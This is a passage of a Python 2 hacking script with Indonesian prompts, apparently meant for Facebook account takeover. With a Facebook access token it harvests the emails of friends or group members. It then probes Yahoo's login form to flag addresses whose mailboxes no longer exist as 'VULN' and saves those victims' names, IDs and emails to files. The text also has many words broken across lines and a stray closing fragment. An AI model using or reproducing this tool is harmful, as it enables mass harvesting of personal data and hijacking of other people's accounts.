	print('\x1b[1;96m[!] \x1b[1;93mStop C
TRL+z')
	print 43*"\033[1;96m="
	for w in kimak['data']:

		jml +=1
		mpsh.append(jml)
		id = w['id']
		nama = w['n
ame']
		links = requests.get("https://graph.facebook.com/
"+id+"?access_token="+toket)
		z = json.loads(links.text)

		try:
			mail = z['email']
			yahoo = re.compile(r'@.*'
)
			otw = yahoo.search(mail).group()
			if 'yahoo.com' i
n otw:
				br.open("https://login.yahoo.com/config/login?
.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.co
m")
				br._factory.is_html = True
				br.select_form(nr=
0)
				br["username"] = mail
				klik = br.submit().read(
)
				jok = re.compile(r'"messages.ERROR_INVALID_USERNAME
">.*')
				try:
					pek = jok.search(klik).group()
				e
xcept:
					continue
				if '"messages.ERROR_INVALID_USER
NAME">' in pek:
					print("\033[1;96m[✓] \033[1;92mVUL
N")
					print("\033[1;96m[➹] \033[1;97mID   \033[1;91m
: \033[1;92m"+id)
					print("\033[1;96m[➹] \033[1;97mE
mail\033[1;91m: \033[1;92m"+mail)
					print("\033[1;96m[
➹] \033[1;97mNama \033[1;91m: \033[1;92m"+nama)
					sa
ve = open('out/TemanMailVuln.txt','a')
					save.write("N
ama : "+ nama + '\n' "ID        : "+ id + '\n' "Email  : 
"+ mail + '\n\n')
					save.close()
					berhasil.append(
mail)
		except KeyError:
			pass
	print 42*"\033[1;96m="

	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mSel
esai \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal
 \033[1;91m: \033[1;97m"+str(len(berhasil))
	print"\033[1
;96m[+] \033[1;92mFile tersimpan \033[1;91m:\033[1;97m ou
t/TemanMailVuln.txt"
	raw_input("\n\033[1;96m[\033[1;97mK
embali\033[1;96m]")
	menu()
	
def clone_dari_member_group
():
	global toket
	os.system('clear')
	try:
		toket=open(
'login.txt','r').read()
	except IOError:
		print"\033[1;9
6m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.
txt')
		time.sleep(1)
		keluar()
	try:
		os.mkdir('out')

	except OSError:
		pass
	os.system('clear')
	print logo
	
mpsh = []
	jml = 0
	print 42*"\033[1;96m="
	id=raw_input(
'\033[1;96m[+] \033[1;93mMasukan ID group \033[1;91m:\033
[1;97m ')
	try:
		r=requests.get('https://graph.facebook.
com/group/?id='+id+'&access_token='+toket)
		asw=json.loa
ds(r.text)
		print"\033[1;96m[\033[1;97m✓\033[1;96m] \0
33[1;93mNama group \033[1;91m:\033[1;97m "+asw['name']
	e
xcept KeyError:
		print"\033[1;96m[!] \x1b[1;91mGroup tid
ak ditemukan"
		raw_input("\n\033[1;96m[\033[1;97mKembali
\033[1;96m]")
		menu()
	jalan('\033[1;96m[✺] \033[1;93m
Mengambil email \033[1;97m...')
	teman = requests.get('ht
tps://graph.facebook.com/'+id+'/members?fields=name,id&li
mit=999999999&access_token='+toket)
	kimak = json.loads(t
eman.text)
	jalan('\033[1;96m[✺] \033[1;93mStart \033[1
;97m...')
	print('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
	
print 42*"\033[1;96m="
	for w in kimak['data']:
		jml +=1

		mpsh.append(jml)
		id = w['id']
		nama = w['name']
		l
inks = requests.get("https://graph.facebook.com/"+id+"?ac
cess_token="+toket)
		z = json.loads(links.text)
		try:
	
		mail = z['email']
			yahoo = re.compile(r'@.*')
			otw 
= yahoo.search(mail).group()
			if 'yahoo.com' in otw:
		
		br.open("https://login.yahoo.com/config/login?.src=fpct
x&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				b
r._factory.is_html = True
				br.select_form(nr=0)
				br
["username"] = mail
				klik = br.submit().read()
				jok
 = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
		
		try:
					pek = jok.search(klik).group()
				except:
		
			continue
				if '"messages.ERROR_INVALID_USERNAME">' i
n pek:
					print("\033[1;96m[✓] \033[1;92mVULN")
					
print("\033[1;96m[➹] \033[1;97mID   \033[1;91m: \033[1;
92m"+id)
					print("\033[1;96m[➹] \033[1;97mEmail\033[
1;91m: \033[1;92m"+mail)
					print("\033[1;96m[➹] \033
[1;97mNama \033[1;91m: \033[1;92m"+nama)
					save = open
('out/GrupMailVuln.txt','a')
					save.write("Nama : "+ n
ama + '\n' "ID        : "+ id + '\n' "Email  : "+ mail + 
'\n\n')
					save.close()
					berhasil.append(mail)
		ex
cept KeyError:
			pass
	print 42*"\033[1;96m="
	print '\0
33[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mSelesai \033[
1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal \033[1;91
m: \033[1;97m"+str(len(berhasil))
	print"\033[1;96m[+] \0
33[1;92mFile tersimpan \033[1;91m:\033[1;97m out/GrupMail
Vuln.txt"
	raw_input("\n\033[1;96m[\033[1;97mKembali\033[
1;96m]")
	menu()
	

def clone_dari_file():
	global toket

	os.system('clear')
	try:
		toket=open('login.txt','r').r
ead()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mTo
ken invalid"
		os.system('rm -rf login.txt')
		time.sleep
(1)
		keluar()
	try:
		os.mkdir('out')
	except OSError:
	
	pass
	os.system('clear')
	print logo
	print 42*"\033[1;9
6m="
	files = raw_input("\033[1;96m[+] \033[1;93mNama Fil
e \033[1;91m: \033[1;97m")
	try:
		total = open(files,"r"
)
		mail = total.readlines()
	except IOError:
		print"\03
3[1;96m[!] \x1b[1;91mFile tidak ditemukan"
		raw_input("\
n\033[1;96m[\033[1;97mKembali\033[1;96m]")
		menu()
	mpsh
 = []
	jml = 0
	jalan('\033[1;96m[✺] \033[1;93mStart \0
33[1;97m...')
	print('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z
')
	print 42*"\033[1;96m="
	mail = open(files,"r").readli
nes()
	for pw in mail:
		mail = pw.replace("\n","")
		jml
 +=1
		mpsh.append(jml)
		yahoo = re.compile(r'@.*')
		ot
w = yahoo.search(mail).group()
		if 'yahoo.com' in otw:
	
		br.open("https://login.yahoo.com/config/login?.src=fpct
x&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
			br
._factory.is_html = True
			br.select_form(nr=0)
			br["u
sername"] = mail
			klik = br.submit().read()
			jok = re
.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
			try:

				pek = jok.search(klik).group()
			except:
				contin
ue
			if '"messages.ERROR_INVALID_USERNAME">' in pek:
			
	print("\033[1;96m[✓] \033[1;92mVULN")
				print("\033[
1;96m[➹] \033[1;97mEmail\033[1;91m: \033[1;92m"+mail)
	
			save = open('out/MailVuln.txt','a')
				save.write("Em
ail: "+ mail + '\n\n')
				save.close()
				berhasil.appe
nd(mail)
	print 42*"\033[1;96m="
	print '\033[1;96m[\033[
1;97m✓\033[1;96m] \033[1;92mSelesai \033[1;97m....'
	pr
int"\033[1;96m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"
+str(len(berhasil))
	print"\033[1;96m[+] \033[1;92mFile T
ersimpan \033[1;91m:\033[1;97m out/FileMailVuln.txt"
	raw
_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
	menu
()
	
       
		
if __name__ == '__main__':
	siapa()
'))
